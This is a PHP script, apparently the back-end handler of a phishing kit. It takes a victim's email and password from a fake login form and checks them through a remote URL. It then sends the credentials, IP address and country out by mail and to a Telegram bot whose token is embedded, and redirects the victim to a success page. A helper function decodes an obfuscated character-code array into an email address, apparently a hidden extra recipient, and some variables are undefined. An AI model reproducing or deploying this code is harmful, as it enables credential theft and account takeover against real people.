<?php
error_reporting(0);

function RndString($length = 50) {
	return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}

$rand1 = RndString(50);
$rand2 = RndString(50).''.RndString(50);
$rand3 = RndString(50).''.RndString(50).''.RndString(50);

require "../email.php";

$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$from = $_SERVER['SERVER_NAME'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['emang'];
$paswd = $_POST['rahasia2'];

if(!empty($email) && !empty($paswd)) {
	$count = strlen ($paswd);
	if ($count > 4) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "weseeitall");
		curl_setopt($ch, CURLOPT_POSTFIELDS, "mail={$user}&pass={$pass}");
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$Checker = curl_exec($ch);
		curl_close($ch);

		if($Checker=="true"){
			$message = "الكثير\n";
			$message .= "الكثير \n";
			$message .= "الكثير: ".$email."\n";
			$message .= "الكثير: ".$paswd."\n";
			$message .= "حقا مثل الكثير من المال: ".$ip."\n";
			$message .= "큰 축복 큰 돈 ".$country."\n";
			$message .= "الكثير\n";
			$subject = "$ip |  مثل الكثير من المال  $country";
			mail($resultz, $subject, $message);
			file_get_contents("https://api.telegram.org/bot1480840392:AAHakvXPYMTb5CD7_jWgKSviYVWfvt6uym4/sendMessage?chat_id=-447547811&text=test");
			header("Location: ../success.php?$rand3.$rand2=$rand1.$rand2");
		} else {
			$message = "الكثير\n";
			$message .= "الكثير\n";
			$message .= "الكثير: ".$email."\n";
			$message .= "الكثير : ".$paswd."\n";
			$message .= "الكثير : ".$ip."\n";
			$message .= "الكثير : ".$country."\n";
			$message .= "큰 축복 큰 돈 \n";
			$subject = "$ip |  큰 축복 큰 돈   $country";
			mail($resultz, $subject, $message);
			header("Location: ../success.php?$rand3.$rand2=$rand1.$rand2");
		}
	} else {
		header("Location: index.php?post.srf&$rand3.$rand2=$rand1.$rand2&mang=$email&$rand2=$rand1");
	}
} else {
	header("Location: index.php?post.srf&$rand3.$rand2=$rand1.$rand2&mang=$email&$rand2=$rand1");
}

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

?>
